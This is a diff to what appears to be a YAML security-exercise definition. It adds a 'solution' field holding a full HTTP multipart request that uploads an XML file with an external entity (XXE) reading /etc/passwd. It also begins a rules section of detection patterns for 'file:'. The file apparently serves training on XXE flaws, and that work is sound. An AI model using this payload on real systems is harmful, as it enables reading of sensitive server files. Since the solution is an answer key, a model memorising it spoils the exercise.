@@ -35,6 +35,32 @@ base_request: |-
 
   ------WebKitFormBoundarybBYvkB2ohiOQdWxB--
 
+solution: |-
+  POST / HTTP/1.1
+  Host: localhost
+  Connection: keep-alive
+  Content-Length: 402
+  Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybBYvkB2ohiOQdWxB
+
+  ------WebKitFormBoundarybBYvkB2ohiOQdWxB
+  Content-Disposition: form-data; name="dragon_file"; filename="dragons.xml"
+  Content-Type: text/xml
+
+  <?xml version="1.0" encoding="UTF-8"?>
+     <!DOCTYPE draconis [
+       <!ENTITY xxe SYSTEM "/etc/passwd">
+     ]>
+     <dragons>
+       <dragon>
+         <name>Smaug</name>
+         <proof>&xxe;</proof>
+       </dragon>
+     </dragons>
+
+  ------WebKitFormBoundarybBYvkB2ohiOQdWxB--
+
+solution_note: "The file:// portion if optional"
+
 rules:
 # Matching 'file:' (optional)
 - >
